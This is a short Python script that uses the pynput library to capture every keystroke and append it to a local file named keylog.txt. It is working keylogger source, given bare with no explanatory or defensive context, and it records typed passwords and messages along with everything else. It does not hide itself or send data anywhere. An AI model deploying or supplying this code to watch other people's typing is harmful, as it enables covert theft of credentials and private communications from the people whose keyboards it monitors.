from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f"[{key}]")
    except Exception as e:
        print(f"Error: {e}")


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()